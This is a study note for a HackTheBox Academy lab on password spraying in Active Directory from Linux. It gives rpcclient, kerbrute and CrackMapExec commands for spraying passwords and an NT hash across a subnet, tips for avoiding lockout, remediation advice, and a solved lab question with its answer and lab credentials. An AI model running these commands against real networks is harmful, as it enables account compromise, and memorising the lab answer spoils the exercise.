# Internal Password Spraying - from Linux

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1271](https://academy.hackthebox.com/app/module/143/section/1271) |

---

## 🔑 Ключові команди

### rpcclient — bash one-liner spray

```bash
# Успішний логін визначається по рядку "Authority Name"
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

---

### Kerbrute — password spray

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

> ⚠️ Password spraying через Kerbrute **рахується** як failed logon → може lockout!

---

### CrackMapExec — spray + фільтрація успішних

```bash
# Spray одним паролем по списку юзерів
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep "+"

# Валідація конкретних credentials
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

---

### CrackMapExec — Local Admin Password Reuse (NT hash)

```bash
# Spray NT hash локального адміна по всій підмережі
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator \
  -H 88ad09182de639ccc6579eb0849751cf | grep "+"

# --local-auth → тільки 1 спроба на хост, без ризику lockout доменного акаунта
```

> ⚠️ Без `--local-auth` CME пробує доменну автентифікацію → може заблокувати доменний акаунт!

---

## 📋 Логіка визначення успішного логіну

| Інструмент | Ознака успіху |
|------------|---------------|
| rpcclient | `Authority Name: INLANEFREIGHT` у відповіді |
| Kerbrute | `[+] VALID LOGIN: user@domain:password` |
| CrackMapExec | `[+]` на початку рядка |

---

## 🛡️ Remediation

| Проблема | Рішення |
|----------|---------|
| Password reuse (local admin) | Впровадити **LAPS** (Local Administrator Password Solution) |
| Weak domain passwords | Enforce strong password policy (min 12+ chars) |
| No lockout policy | Встановити lockout threshold |

---

## ❓ Questions

### Q1 — Юзер на "s" з паролем Welcome1

> **Find the user account starting with the letter "s" that has the password Welcome1.**

**Steps:**

```bash
ssh htb-student@<TARGET_IP>   # pass: HTB_@cademy_stdnt!

# Отримати список валідних юзерів
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt

# Spray паролем Welcome1
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
# [+] VALID LOGIN: sgage@inlanefreight.local:Welcome1

# Або через rpcclient
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

**Answer:** `sgage`
